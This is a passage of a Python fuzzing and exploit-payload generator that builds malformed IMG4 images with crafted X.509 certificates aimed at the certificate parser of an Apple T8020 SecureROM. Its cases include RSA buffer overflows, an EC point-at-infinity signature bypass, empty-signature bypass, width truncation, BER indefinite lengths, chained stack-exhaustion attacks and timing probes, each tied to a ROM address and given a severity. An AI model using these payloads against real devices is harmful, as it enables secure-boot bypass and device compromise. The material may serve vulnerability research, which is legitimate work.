    "SET data parsed as certificate → field offset mismatch.",
    "0x100012000+", "HIGH", "TYPE_CONFUSION")

# M5: Two certificates where second has negative serial
cert1 = build_x509_cert(
    tbs=build_tbs_cert(serial=1, pubkey=build_rsa_pubkey(modulus_bytes=64)),
    sig_value=D.bit_string(b'\x00' * 64),
)
cert2 = build_x509_cert(
    tbs=build_tbs_cert(serial=-1, pubkey=build_rsa_pubkey(modulus_bytes=64)),
    sig_value=D.bit_string(b'\x00' * 64),
)
chain = D.sequence([cert1, cert2])
reg("cert_chain_neg_serial", build_img4_with_cert(chain),
    "Two-cert chain where second cert has serial=-1. Chain iterator at 0x100012DA4 "
    "parses each cert → negative serial in INTEGER comparison may cause signed/unsigned "
    "confusion in cert matching or lookup table indexing.",
    "0x100012DA4", "HIGH", "SIGNEDNESS")

# ============================================================================
# Category N: Pre-Verify Crypto Buffer Attacks
# ============================================================================
print("\n=== N: Pre-Verify Crypto Buffer Attacks ===\n")

# N0: Cert with RSA-4096 modulus + exponent crafted to overflow
big_mod = int.from_bytes(b'\x01' * 512, 'big')  # 4096-bit
big_exp = 0xFFFFFFFFFFFFFFFF  # 64-bit exponent
pub = D.sequence([D.integer(big_mod), D.integer(big_exp)])
pubkey_info = D.sequence([build_algoid(OID_RSA), D.bit_string(pub)])
tbs = build_tbs_cert(pubkey=pubkey_info)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 256)])
reg("cert_rsa4096_bigexp", build_img4_with_cert(cert),
    "Cert with RSA-4096 modulus + 64-bit exponent (0xFFFFFFFFFFFFFFFF). Crypto init at "
    "0x10001901C does 8 unchecked memset_zero/memcpy calls. Oversized modulus → crypto "
    "buffer overflow. Giant exponent → infinite loop or buffer overflow in modexp.",
    "0x10001901C", "CRITICAL", "MEMCPY_UNCHECKED_SIZE")

# N1: Cert with ECDSA key but RSA signatureAlgorithm (algo mismatch)
ec_pubkey = D.sequence([
    D.sequence([D.oid(OID_EC_PUBKEY), D.oid(bytes([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07]))]),
    D.bit_string(b'\x04' + b'\x01' * 32 + b'\x02' * 32),  # Uncompressed EC point
])
tbs = build_tbs_cert(pubkey=ec_pubkey, sig_algo=build_algoid(OID_RSA_SHA256))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_algo_mismatch_ec_rsa", build_img4_with_cert(cert),
    "Cert with EC public key but RSA signatureAlgorithm. Crypto dispatcher based on "
    "algo OID selects RSA verifier → fed EC point data as RSA modulus → type confusion "
    "in crypto primitive at 0x100019000+. Key size mismatch causes buffer miscalculation.",
    "0x100019000+", "CRITICAL", "TYPE_CONFUSION")

# N2: Cert with EC point where x/y coordinates are 0 (point at infinity)
ec_pubkey_inf = D.sequence([
    D.sequence([D.oid(OID_EC_PUBKEY), D.oid(bytes([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07]))]),
    D.bit_string(b'\x04' + b'\x00' * 32 + b'\x00' * 32),  # Point at infinity
])
tbs = build_tbs_cert(pubkey=ec_pubkey_inf, sig_algo=build_algoid(OID_ECDSA_SHA256, with_null=False))
cert = D.sequence([tbs, build_algoid(OID_ECDSA_SHA256, with_null=False), D.bit_string(b'\x00' * 72)])
reg("cert_ec_point_infinity", build_img4_with_cert(cert),
    "Cert with EC public key = point at infinity (0,0). ECDSA verifier at 0x100019000+ "
    "may divide by zero or skip point validation → any signature validates. "
    "Classic EC implementation bug — enables signature bypass.",
    "0x100019000+", "CRITICAL", "CRYPTO_WEAKNESS")

# N3: Cert with signature claiming 0 bytes (empty signature)
tbs = build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), b'\x03\x01\x00'])  # BitString: 0 sig bytes
reg("cert_empty_signature", build_img4_with_cert(cert),
    "Cert with 0-byte signature (BitString with only unused-bits byte). Signature copier "
    "at 0x100019680 copies 0 bytes → crypto verifier operates on uninitialized buffer → "
    "if buffer contains previous valid sig data → bypass.",
    "0x100019680", "CRITICAL", "MISSING_VALIDATION")

# ============================================================================
# Category O: Width Truncation / Signedness Attacks
# ============================================================================
print("\n=== O: Width Truncation in Cert Parser ===\n")

# O0: Cert field with length exactly 0x100 (triggers WIDTH_TRUNCATION_CMP)
# At 0x10000D530: CMP w20,#0x100 but x20 from 64-bit add → upper bits ignored
# Value 0x100000100 truncated to w20 = 0x100 → passes check, but actual = 4GB+256
# We can't send 4GB, but we can set up the 32-bit compare to overflow
issuer = build_name(cn=b'A' * 0x100)  # Exactly 256 bytes in CN
tbs = build_tbs_cert(issuer=issuer, pubkey=build_rsa_pubkey(modulus_bytes=64))
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_issuer_cn_0x100", build_img4_with_cert(cert),
    "Cert with issuer CN exactly 256 bytes (0x100). WIDTH_TRUNCATION_CMP at 0x10000D530 "
    "compares w20 (32-bit) with #0x100, but x20 set by 64-bit add. If upper 32 bits "
    "nonzero → comparison gives wrong result → bypasses size validation.",
    "0x10000D530", "HIGH", "WIDTH_TRUNCATION")

# O1: DER element with length 0x7F (boundary of short/long form)
# Parser at 0x10000D514 uses ldrb → sub → may underflow at boundary
boundary_data = b'\x30\x7F' + b'\x00' * 0x7F  # Length = 127 (max short form)
tbs_raw = (D.context_tag(0, D.integer(2))
           + D.integer(0x1337)
           + build_algoid(OID_RSA_SHA256)
           + boundary_data  # Boundary-length issuer
           + build_validity()
           + build_name(cn=b"T")
           + build_rsa_pubkey(modulus_bytes=64))
tbs = b'\x30' + D.length(len(tbs_raw)) + tbs_raw
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_len_boundary_0x7f", build_img4_with_cert(cert),
    "Cert with issuer using length=0x7F (max short-form DER). At boundary between "
    "short (0x00-0x7F) and long form (0x81+). Parser at 0x10000D514 may select wrong "
    "branch → interprets 0x7F as long-form indicator → reads next byte as count.",
    "0x10000D514", "HIGH", "BOUNDARY_CONDITION")

# O2: DER with length byte 0x80 (indefinite length — forbidden in DER but valid in BER)
# 0x80 in DER length position means "indefinite" in BER → no length, terminated by 0x00 0x00
indef_issuer = b'\x30\x80' + b'\x00' * 60 + b'\x00\x00'  # BER indefinite SEQUENCE
tbs_raw = (D.context_tag(0, D.integer(2))
           + D.integer(0x1337)
           + build_algoid(OID_RSA_SHA256)
           + indef_issuer  # Indefinite-length issuer (BER, not DER)
           + build_validity()
           + build_name(cn=b"T")
           + build_rsa_pubkey(modulus_bytes=64))
tbs = b'\x30' + D.length(len(tbs_raw)) + tbs_raw
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_indef_length_ber", build_img4_with_cert(cert),
    "Cert issuer with indefinite length (0x80 = BER mode). DER forbids indefinite length "
    "but parser may not reject it → scans for 0x00 0x00 terminator, reading past buffer "
    "if terminator not found. Targets DER length decoder.",
    "0x100013970", "CRITICAL", "BER_INDEFINITE_LENGTH")

# ============================================================================
# Category P: Combined / Chained Attacks
# ============================================================================
print("\n=== P: Combined Cert Attacks ===\n")

# P0: Cert with BOTH deep nesting AND oversized fields
inner_name = D.printable_string(b'A' * 200)
for _ in range(20):
    inner_name = D.set_of(D.sequence([D.oid(OID_CN), inner_name]))
tbs = D.sequence([
    D.context_tag(0, D.integer(2)),
    D.integer(0x1337),
    build_algoid(OID_RSA_SHA256),
    D.sequence([inner_name]),  # 20-level nested + large names
    build_validity(),
    build_name(cn=b'B' * 200),  # Also big subject
    build_rsa_pubkey(modulus_bytes=128),
])
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_combo_deep_and_big", build_img4_with_cert(cert),
    "Cert with 20-level nested issuer + 200B names + 128B RSA key. Combines recursion "
    "attack (0x1000123D0) with memcpy overflow (0x10001276C). Stack frames from recursion "
    "reduce available stack space → smaller overflow needed for corruption.",
    "0x1000123D0+0x10001276C", "CRITICAL", "COMBINED")

# P1: Cert chain where each cert has progressively deeper extensions
certs = []
for depth in [5, 10, 15]:
    inner_ext = D.octet_string(b'\x00' * 4)
    for _ in range(depth):
        inner_ext = D.sequence([D.oid(OID_SKI), D.octet_string(inner_ext)])
    c = build_x509_cert(
        tbs=build_tbs_cert(
            serial=depth,
            pubkey=build_rsa_pubkey(modulus_bytes=64),
            extensions=[inner_ext],
        ),
        sig_value=D.bit_string(b'\x00' * 64),
    )
    certs.append(c)
chain = D.sequence(certs)
reg("cert_chain_progressive_depth", build_img4_with_cert(chain),
    "3-cert chain with progressively deeper extensions (5/10/15 levels). Chain iterator "
    "at 0x100012DA4 processes each cert → stack usage accumulates across chain. "
    "Third cert's 15-level extensions hit stack limit reduced by first two certs.",
    "0x100012DA4+0x1000128C4", "CRITICAL", "COMBINED")

# P2: Cert with oversized extension value + 64-bit DER length in extension
ext_raw = (b'\x30'  # SEQUENCE tag
           + b'\x88\x00\x00\x00\x01\x00\x00\x00\x40'  # 8-byte length → wraps to 0x40
           + D.oid(OID_BASIC_CONSTRAINTS)
           + D.boolean(True)
           + D.octet_string(b'\x00' * 48))
tbs = build_tbs_cert(
    pubkey=build_rsa_pubkey(modulus_bytes=64),
    extensions=[ext_raw],  # Raw malformed extension
)
cert = D.sequence([tbs, build_algoid(OID_RSA_SHA256), D.bit_string(b'\x00' * 64)])
reg("cert_ext_len64_wrap", build_img4_with_cert(cert),
    "Extension SEQUENCE with 8-byte DER length wrapping to 0x40. Extension parser at "
    "0x100014304 uses DER length for buffer ops → 64-bit→32-bit truncation. "
    "Combined with UNCHECKED_INDEX at same function → controlled corruption.",
    "0x100014304+0x100013B0C", "CRITICAL", "COMBINED")

# P3: Manifest signature area with crafted cert + oversized IM4M signature
big_cert = build_x509_cert(
    tbs=build_tbs_cert(pubkey=build_rsa_pubkey(modulus_bytes=64)),
    sig_value=D.bit_string(b'\x00' * 64),
)
# IM4M with cert + oversized manifest signature 
big_manifest_sig = D.octet_string(b'\x44' * 512)
reg("cert_plus_big_manifest_sig", build_img4_with_cert(big_cert, extra_sig=big_manifest_sig),
    "Valid-structure cert + 512B manifest signature. Manifest sig copier at 0x100017000+ "
    "copies sig to buffer before verification. If buffer < 512B → overflow. "
    "Cert parsing + manifest sig copy = two attack surfaces in one payload.",
    "0x100017F00+0x100019680", "CRITICAL", "COMBINED")

# ============================================================================
# Category Q: Timing Differential Probes
# ============================================================================
print("\n=== Q: Timing Differential Probes ===\n")

# These payloads are designed to produce measurably different timing when they reach
# different code paths in the cert parser. By comparing response times, we can
# determine which code paths are being executed.

# Q0: Minimal cert (baseline for cert parsing timing)
minimal_cert = D.sequence([
    D.sequence([D.integer(0)]),  # Tiny TBS
    D.sequence([D.integer(0)]),  # Tiny algo
    D.bit_string(b'\x00'),      # Tiny sig
])
reg("cert_timing_minimal", build_img4_with_cert(minimal_cert),
    "Minimal cert structure (baseline). Measures time for cert parser entry + immediate "
    "rejection. Compare with larger certs to measure parsing depth by timing delta.",
    "0x100012000+", "MEDIUM", "TIMING_PROBE")

# Q1: Cert with valid RSA structure but wrong key
tbs = build_tbs_cert(
    issuer=build_name(cn=b"Apple Root CA"),
    subject=build_name(cn=b"Apple Secure Boot Signing"),
    pubkey=build_rsa_pubkey(modulus_bytes=256),
)
cert = build_x509_cert(tbs=tbs, sig_value=D.bit_string(b'\x00' * 256))
reg("cert_timing_full_rsa", build_img4_with_cert(cert),
    "Full X.509 cert with realistic RSA-2048 structure. Measures time including full "
    "cert field extraction + key parsing. Timing difference from minimal = cert parse time.",
    "0x100012000+", "MEDIUM", "TIMING_PROBE")

# Q2: Cert with valid ECDSA structure
ec_key = D.sequence([
    D.sequence([D.oid(OID_EC_PUBKEY), D.oid(bytes([0x2A, 0x86, 0x48, 0xCE, 0x3D, 0x03, 0x01, 0x07]))]),
    D.bit_string(b'\x04' + b'\x01' * 32 + b'\x02' * 32),
])
tbs = build_tbs_cert(
    pubkey=ec_key,
    sig_algo=build_algoid(OID_ECDSA_SHA256, with_null=False),
)
cert = D.sequence([tbs, build_algoid(OID_ECDSA_SHA256, with_null=False), D.bit_string(b'\x00' * 72)])
reg("cert_timing_full_ecdsa", build_img4_with_cert(cert),
    "Full X.509 cert with ECDSA-P256 structure. Timing difference from RSA cert = "
    "dispatch path difference. If ECDSA takes longer → crypto function reached.",
    "0x100012000+", "MEDIUM", "TIMING_PROBE")

# Q3: Cert identical to Q1 but with extensions
basic_ext = build_extension(OID_BASIC_CONSTRAINTS, D.sequence([D.boolean(True), D.integer(0)]), critical=True)
ku_ext = build_extension(OID_KEY_USAGE, b'\x03\x02\x05\xA0', critical=True)
ski_ext = build_extension(OID_SKI, b'\x00' * 20)
tbs = build_tbs_cert(
    issuer=build_name(cn=b"Apple Root CA"),
    subject=build_name(cn=b"Apple Secure Boot Signing"),
    pubkey=build_rsa_pubkey(modulus_bytes=256),
    extensions=[basic_ext, ku_ext, ski_ext],
)
cert = build_x509_cert(tbs=tbs, sig_value=D.bit_string(b'\x00' * 256))
reg("cert_timing_with_extensions", build_img4_with_cert(cert),
    "Full RSA cert + 3 standard extensions (BC, KU, SKI). Timing delta from Q1 = "
    "extension parsing overhead. Confirms whether extension parser (0x10001408C+) "
    "is reached during pre-verify cert processing.",
    "0x10001408C", "MEDIUM", "TIMING_PROBE")

# ============================================================================
# Save manifest
# ============================================================================
out_manifest = {
    "generator": "img4_phase3_cert_generator.py",
    "date": __import__('datetime').datetime.now().isoformat(),
    "target": "T8020 B1 SecureROM (CPID:8020 CPRV:11)",
    "total_cases": len(test_cases),
    "phase": 3,
    "note": ("Certificate parser targeted payloads. Cert chain is 4th element of IM4M, "
             "parsed at 0x100012000+ BEFORE signature verification at 0x100019000+."),
    "severity_summary": {},
    "cases": test_cases,
}
for tc in test_cases:
    sev = tc["severity"]
    out_manifest["severity_summary"][sev] = out_manifest["severity_summary"].get(sev, 0) + 1

manifest_path = OUTPUT_DIR / "test_manifest.json"
manifest_path.write_text(json.dumps(out_manifest, indent=2))

print(f"\n{'='*70}")
print(f"Generated {len(test_cases)} cert-targeted test cases in {OUTPUT_DIR}")
print(f"Severity: {out_manifest['severity_summary']}")
print(f"Manifest: {manifest_path}")
